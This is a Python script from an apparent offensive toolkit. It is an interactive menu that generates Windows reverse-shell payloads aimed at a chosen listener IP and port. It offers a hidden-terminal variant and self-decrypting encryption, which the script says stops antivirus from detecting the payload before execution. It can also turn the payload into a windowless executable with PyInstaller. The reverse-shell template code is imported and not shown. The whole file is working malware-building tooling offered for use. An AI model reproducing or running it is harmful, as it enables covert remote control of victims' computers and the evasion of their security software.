import os
import platform
import secrets
import shutil
import string
import subprocess
import sys

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from terminal_management.tman import clear
from input_management.validations import validate_ip, validate_singe_port, validate_path, getch, validate_file

from Shells_Payloads.reverse_shell_templates.pythonBased import (
    windows_reverse_shell_hidden_terminal,
    windows_reverse_shell_active_terminal)

from encryptor.self_decrypting_encryption import encrypt_payload
def create_payload(host, port, file_path, nameForFile=None, payload_type=None):
    if platform.system() == 'Windows':
        if nameForFile:
            file_path += f'\\{nameForFile}.py'
        else:
            file_path += '\\python_reverse_shell_for_windows.py'
    elif platform.system() == 'Linux':
        if nameForFile:
            file_path += f'/{nameForFile}.py'
        else:
            file_path += '/python_reverse_shell_for_windows.py'


    with open(file_path, 'w') as f:
        if payload_type == 'windows_reverse_shell_active_terminal':
            f.write(windows_reverse_shell_active_terminal(host, port))
        elif payload_type == 'windows_reverse_shell_hidden_terminal':
            f.write(windows_reverse_shell_hidden_terminal(host, port))
        else:
            return f'Invalid Payload Type {payload_type} {repr(payload_type)}'
    return file_path



def main():
    while True:
        print("""
        
                E: Encrypt a payload
                X: Create an executable file from a payload
                -------------------------------
                Q. Quit
                1. Windows Reverse Shell Active Terminal
                2. Windows Reverse Shell Hidden Terminal
                """)
        print("> ", end='', flush=True)
        choice = getch()
        choice = choice.upper()
        if choice not in ['E','X','Q','1', '2']:
            clear()
            print("Invalid choice, please try again.")
            continue
        if choice == 'Q':
            exit()
        elif choice == 'E':
            encrypt_payload()
            continue
        elif choice == 'X':
            make_exe()
            continue
        clear()
        while True:
            host = input("Enter the listener IP: ")
            if validate_ip(host):
                break
            else:
                print("Invalid IP address")
        port = validate_singe_port()
        clear()
        print("Give a name to the file")
        print("leave empty to use the default name")
        nameForFile = input("Name: ")
        if nameForFile == '':
            nameForFile = None
        clear()
        print("Enter the file path to save the payload")
        print("leave empty to save in the current directory")
        file_path = validate_path()
        clear()
        if choice == '1':
            payload_type = 'windows_reverse_shell_active_terminal'
        elif choice == '2':
            payload_type = 'windows_reverse_shell_hidden_terminal'
        clear()
        file_path = create_payload(host, port, file_path, nameForFile, payload_type)
        if validate_file(file_path):
            print(f"Payload created at {file_path}")
            print('This Software has a feature to make a self-decrypting encrypted payload.')
            print('This feature prevent the payload from being detected by AVs before execution.')
            encrypt = input("Do you want to encrypt the payload? (Y/N): ")
            if encrypt.upper() == 'Y':
                clear()
                print("Encrypting the payload")
                encrypted_file_address = encrypt_payload(file_path)
                print("Do you want to create a executable file from the encrypted payload?")
                print("However this only works on WINDOWS")
                choice = input(" (Y/N): ")
                if choice.upper() == 'Y':
                    make_exe(encrypted_file_address)


     

def make_exe(payload_file_path=None):
    if not payload_file_path:
        while True:
            payload_file_path = input('file address: ').replace('\'', '').replace('[', '').replace(']', '').replace('\"','')
            print(f'{payload_file_path} is the file address? (y/n): ')
            if input().lower() == 'y':
                payload_file_path = validate_file(payload_file_path)
                clear()
                break
    try:
        input(f"Path: {payload_file_path}")
        clear()
        print("Running PyInstaller to create an executable...")
        print("This may take a while.")
        # make random directory to run PyInstaller in
        random_string = ''.join(secrets.choice(string.ascii_letters) for i in range(10))
        os.mkdir(os.path.join(os.path.dirname(payload_file_path), random_string))
        new_working_dir = os.path.join(os.path.dirname(payload_file_path), random_string)

        with subprocess.Popen(['pyinstaller', '-F', '--clean', '-w', payload_file_path],
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, cwd=new_working_dir) as proc:
            stdout, stderr = proc.communicate()
            if proc.returncode != 0:
                print("An error occurred while running PyInstaller.")
                print(stderr)
            else:
                print("PyInstaller ran successfully.")
                print(stdout)
                exe_file_path = os.path.join(new_working_dir, 'dist', os.path.basename(payload_file_path).replace('.py', '.exe'))
                shutil.move(exe_file_path, os.path.expanduser('~'))
                print(f"Executable created at {os.path.join(os.path.expanduser('~'), os.path.basename(payload_file_path).replace('.py', '.exe'))}")
        # cleanup excess files
        try:
            print(f"Deleting {new_working_dir}"'')
            selection = input("Do you want to delete this directory? (Y/N): ")
            if selection.upper() == 'Y':
                shutil.rmtree(new_working_dir)
        except OSError as e:
            print(f"Error: {e.strerror}")


    except subprocess.CalledProcessError as e:
        print("An error occurred while running PyInstaller.")
        print(e.output)

if __name__ == '__main__':
    main()
